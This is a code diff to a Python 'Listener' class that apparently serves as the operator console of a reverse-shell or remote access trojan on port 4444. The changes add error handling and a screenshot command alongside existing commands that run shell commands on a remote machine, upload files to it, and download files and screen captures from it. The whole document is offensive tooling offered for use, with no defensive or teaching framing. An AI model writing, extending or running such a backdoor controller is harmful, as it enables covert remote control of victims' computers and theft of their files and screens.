@@ -37,7 +37,7 @@ class Listener:
 		content = base64.b64decode(content)
 		with open(path, "wb") as file:
 			file.write(content)
-			print("[+] Download succsessful")
+			print(f"[+] You can see your file as {path}")
 
 	def read_file(self, path):
 		file = open(path, "rb").read()
@@ -47,17 +47,25 @@ class Listener:
 	def run(self):
 		while True:
 			command = input(termcolor.colored("user $ ", "cyan"))
-
-			if command.split()[0] == 'upload':
-				file_content = self.read_file(command.split()[1])
-				command += " " + file_content
 			
-			result = self.execute_remotely(command)
-			
-			if command.split()[0] == "download":
-				self.write_file(command.split()[1], result)
-			else:
-				print(result)
+			try:
+				if command.split()[0] == 'upload':
+					file_content = self.read_file(command.split()[1])
+					command += " " + file_content
+				
+				result = self.execute_remotely(command)
+				
+				if command.split()[0] == "download":
+					self.write_file(command.split()[1], result)
+				elif command.split()[0] == "screenshot":
+					self.write_file("screen.png", result)
+				else:
+					if result != None:
+						print(result)
+					else:
+						print("[~] Check your command")
+			except:
+				print("[-] Something was wrong!")
 
 
 my_listener = Listener("localhost", 4444)
